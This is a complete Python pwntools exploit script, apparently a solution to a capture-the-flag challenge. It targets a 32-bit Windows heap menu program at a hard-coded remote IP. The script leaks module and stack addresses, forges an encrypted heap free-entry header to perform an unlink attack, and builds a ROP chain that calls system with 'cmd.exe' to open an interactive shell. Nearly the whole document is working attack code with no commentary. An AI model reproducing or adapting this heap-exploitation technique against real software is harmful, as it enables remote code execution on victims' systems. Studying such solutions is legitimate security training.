
from pwn import *
context.bits = 32
# context.log_level = "debug"

def add(size, cont):
    assert '\n' not in cont, "wrong content in add()"
    io.sendlineafter("choice?\r\n", "1")
    io.sendlineafter("sword?\r\n", str(size))
    io.sendlineafter("it!\r\n", cont)
    
def delete(idx):
    io.sendlineafter("choice?\r\n", "2")
    io.sendlineafter("destroy?\r\n", str(idx))

def edit(idx, cont):
    assert '\n' not in cont, "wrong content in edit()"
    io.sendlineafter("choice?\r\n", "3")
    io.sendlineafter("polish?\r\n", str(idx))
    io.sendlineafter("time?\r\n", str(len(cont)))
    io.sendlineafter("again : \r\n", cont)
 
def show(idx):
    io.sendlineafter("choice?\r\n", "4")
    io.sendlineafter("check?\r\n", str(idx))

def leave():
    io.sendlineafter("choice?\r\n", "5")

def change_byte(target):
    io.sendlineafter("choice?\r\n", "1337")
    io.sendlineafter("target?\r\n", str(target))

def leak(target, src):
    edit(4, flat(target, src))
    show(5)
    io.recvuntil("Show : ")
    leaked = u32(io.recvuntil("\r\n", drop = True).ljust(4, '\0')[: 4])
    success("leaked {:#x} from {:#x}".format(leaked, src))
    return leaked

def leak_header(chunk_idx):
    overflow_size = 0xff + 1
    header = ""
    while len(header) < 8:
        edit(chunk_idx, 'x' * overflow_size)
        show(chunk_idx)
        io.recvuntil('x' * overflow_size)
        header += io.recvuntil("\r\n", drop = True) + '\0'
        # print(hexdump(header))
        overflow_size += len(header)
        sleep(0.01)

    success("leaked header : ")
    print(hexdump(header[: 8]))
    return header[: 8]

# io = remote("127.0.0.1", 1337)
io = remote("47.112.111.53", 12345)
# sleep(4)

# leak exe base
io.recvuntil("gift : ")
bin_base = int(io.recvuntil("\r\n", drop = True), 16) - 0x001090
success("bin_base @ {:#x}".format(bin_base))
target = bin_base + 0x004370 + 4 * 0x4
success("target @ {:#x}".format(target))

for i in xrange(18):
    add(0xff, p8(65 + i) * 0x10)

# leak encrypted freed _HEAP_FREE_ENTRY header
delete(16)
encrypted_freed_header = leak_header(15)
assert '\n' not in encrypted_freed_header, "bad luck, try again!"

edit(15, flat('x' * 0x100, encrypted_freed_header))
add(0xff, 'z' * 0x10)

# unlink
# delete(3)
delete(4)
delete(6)

edit(3, flat('x' * 0x100, encrypted_freed_header, target - 4, target))
delete(3)

# leak dll

# KERNEL32.dll
sleep_iat = bin_base + 0x003008
success("sleep_iat @ {:#x}".format(sleep_iat))
# ucrtbase.dll
puts_iat = bin_base + 0x0030C8
success("puts_iat @ {:#x}".format(puts_iat))


change_byte(bin_base + 0x0043BC + 4) # g_inuse[4]
edit(4, fit({
    0x0: flat(target, sleep_iat, puts_iat),
    0x3c: p8(1) * 18
}, filler = '\0'))


show(5)
io.recvuntil("Show : ")
KERNEL32 = u32(io.recvuntil("\r\n", drop = True).ljust(4, '\0')[: 4]) - 0x00021ab0
success("KERNEL32 @ {:#x}".format(KERNEL32))
assert KERNEL32 & 0xfff == 0, "Try again!"
GetPtrCalDataArray_iat = KERNEL32 + 0x00080b4c
success("GetPtrCalDataArray_iat @ {:#x}".format(GetPtrCalDataArray_iat))


show(6)
io.recvuntil("Show : ")
ucrtbase = u32(io.recvuntil("\r\n", drop = True).ljust(4, '\0')[: 4]) - 0x000b89b0
success("ucrtbase @ {:#x}".format(ucrtbase))
assert ucrtbase & 0xfff == 0, "Try again!"
system = ucrtbase + 0x000efd80
success("system @ {:#x}".format(system))


KERNELBASE = leak(target, GetPtrCalDataArray_iat)  - 0x00151fa0
success("KERNELBASE @ {:#x}".format(KERNELBASE))
assert KERNELBASE & 0xfff == 0, "Try again!"
BasepFilterInfo = KERNELBASE + 0x001c46b0
success("BasepFilterInfo @ {:#x}".format(BasepFilterInfo))


heap = leak(target, BasepFilterInfo)
success("heap @ {:#x}".format(heap))
stack_pointer = heap + 0x0000001d0
success("stack_pointer @ {:#x}".format(stack_pointer))

# context.log_level = "debug"
stack = leak(target, stack_pointer)
success("stack @ {:#x}".format(stack))
ret_addr = stack + 0x00000048
success("ret_addr @ {:#x}".format(ret_addr))


# pause()
edit(4, flat(target, ret_addr, "cmd.exe\0"))
# edit(4, flat(target, ret_addr, "calc.exe\0"))
ret_chain = flat(bin_base + 0x001552) * 0x48
rop = flat(
    ret_chain,
    system,
    0xdeadbeef,
    target + 8, 
)
# pause()
edit(5, rop)
leave()

io.interactive()